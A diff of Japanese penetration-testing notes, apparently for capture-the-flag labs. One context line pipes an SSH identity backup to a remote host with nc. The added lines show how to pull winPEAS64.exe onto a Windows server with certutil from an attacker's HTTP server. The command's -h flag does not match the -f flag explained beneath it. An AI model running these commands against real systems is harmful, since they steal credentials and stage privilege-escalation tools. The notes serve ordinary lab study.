@@ -1393,7 +1393,20 @@ nc 10.10.14.2 1337 < /home/david/public_www/protected-file-area/backup-ssh-ident
 
 ```
 
+- Windows server から、powershell 使わずにファイルをdownload したい
 
+[リンク: 15分20秒](https://www.youtube.com/watch?v=LN5ORLHaqXI)
+
+```
+
+exe: 欲しいファイルが winPEAS64.exe
+Linux で port 8000 で simpleHttpserver起動後
+
+certutil -urlcache -h http://ip:8000/winPEAS64.exe winPEAS64.exe
+
+-f: 特定の URL のフェッチとキャッシュの更新を強制する。
+
+```
 
 - Windows で user.txt を探したい
 
